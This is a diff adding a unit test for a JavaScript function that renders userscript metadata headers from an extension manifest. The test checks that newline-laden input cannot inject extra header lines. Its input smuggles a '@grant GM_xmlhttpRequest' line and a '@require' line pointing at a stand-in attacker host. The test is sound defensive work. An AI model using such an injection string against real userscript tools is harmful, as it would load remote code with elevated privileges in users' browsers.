@@ -34,6 +34,14 @@ describe("renderMetadata", () => {
     assert.deepEqual(values(text, "inject-into"), ["content"]);
   });
 
+  it("keeps every value on one line, so nothing it is given can add header lines", () => {
+    const { model, files: all } = extension({});
+    const text = renderMetadata(model, all, "ns\n// @grant GM_xmlhttpRequest\r\n// @require https://evil.test/x.js", grantsFor([]));
+    assert.equal(values(text, "grant").includes("GM_xmlhttpRequest"), false);
+    assert.deepEqual(values(text, "require"), []);
+    assert.equal(text.split("\n").length, renderMetadata(model, all, "ns", grantsFor([])).split("\n").length, "no extra lines");
+  });
+
   it("matches the union of the groups, maps <all_urls>, and runs everywhere when there are no content scripts", () => {
     const text = header({ content_scripts: [{ matches: ["https://a.test/*", "<all_urls>"] }, { matches: ["https://a.test/*", "https://b.test/*"] }] });
     assert.deepEqual(values(text, "match"), ["https://a.test/*", "*://*/*", "https://b.test/*"]);
